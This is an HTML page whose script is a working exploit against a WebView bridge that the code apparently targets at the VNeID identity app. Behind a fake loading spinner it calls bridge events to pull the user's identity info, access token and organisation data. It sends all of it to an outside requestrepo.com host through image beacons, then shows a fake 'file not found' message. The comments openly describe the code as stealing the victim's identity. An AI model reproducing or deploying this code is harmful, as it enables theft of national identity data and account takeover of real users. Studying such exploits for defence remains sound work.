<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Đang tải...</title>
<style>
body { font-family: sans-serif; text-align: center; padding: 40px; background: #f5f5f5; }
.spinner { border: 4px solid #ddd; border-top: 4px solid #1a73e8; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
@keyframes spin { to { transform: rotate(360deg); } }
#status { color: #666; margin-top: 10px; }
#data { display: none; background: #fff; padding: 20px; border-radius: 8px; margin-top: 20px; text-align: left; word-break: break-all; }
</style>
</head>
<body>

<div class="spinner" id="spinner"></div>
<div id="status">Đang xử lý yêu cầu...</div>
<div id="data"></div>

<script>
(function() {
    var EXFIL = "https://9liv9n84.requestrepo.com"
    var HOME = "https://linhnph05.github.io/static/vneid.html";
    var stolen = {};
    var pending = 3;

    function send(tag, obj) {
        new Image().src = EXFIL + "/" + tag + "?d=" + encodeURIComponent(JSON.stringify(obj));
    }

    function done(tag, data) {
        stolen[tag] = data;
        send(tag, data);
        pending--;
        if (pending <= 0) finish();
    }

    function finish() {
        // Send combined payload
        send("full", stolen);
        // Show fake "page not found" after exfil
        document.getElementById("spinner").style.display = "none";
        document.getElementById("status").textContent = "Không tìm thấy tệp. Vui lòng thử lại sau.";
    }

    // Check if VNeID bridge is available
    if (window.ReactNativeWebView) {
        // Set up response handler
        function handler(e) {
            var raw = e.detail || e.data || e;
            var msg;
            try {
                msg = typeof raw === "string" ? JSON.parse(raw) : raw;
                if (typeof msg === "string") msg = JSON.parse(msg);
            } catch(x) { return; }
            if (!msg || !msg.event) return;

            if (msg.event === "ON_GET_USER_INFO") {
                done("userinfo", msg.data);
            }
            if (msg.event === "ON_GET_ACCESS_TOKEN") {
                done("token", msg.data);
            }
            if (msg.event === "ON_GET_ORG_INFO") {
                done("org", msg.data);
            }
        }

        window.addEventListener("nativeMessage", handler);
        window.addEventListener("message", handler);
        document.addEventListener("message", handler);

        // Call bridge events — same pattern as the miniapp's VAdapter
        function bridgeCall(event, data) {
            window.ReactNativeWebView.postMessage(JSON.stringify({
                event: event,
                data: data || {}
            }));
        }

        // Steal victim's identity
        bridgeCall("GET_USER_INFO");

        // Steal VNeID access token
        setTimeout(function() { bridgeCall("GET_ACCESS_TOKEN"); }, 500);

        // Steal org info
        setTimeout(function() { bridgeCall("GET_ORG_INFO"); }, 1000);

        // Timeout fallback
        setTimeout(function() {
            if (pending > 0) {
                send("partial", stolen);
                finish();
            }
        }, 10000);

    } else {
        // Not in WebView — still try to grab localStorage from miniapp origin
        // (won't work cross-origin, but log the attempt)
        send("no_bridge", { ua: navigator.userAgent, url: location.href });
        document.getElementById("spinner").style.display = "none";
        document.getElementById("status").textContent = "Không tìm thấy tệp. Vui lòng thử lại sau.";
    }
})();
</script>
</body>
</html>
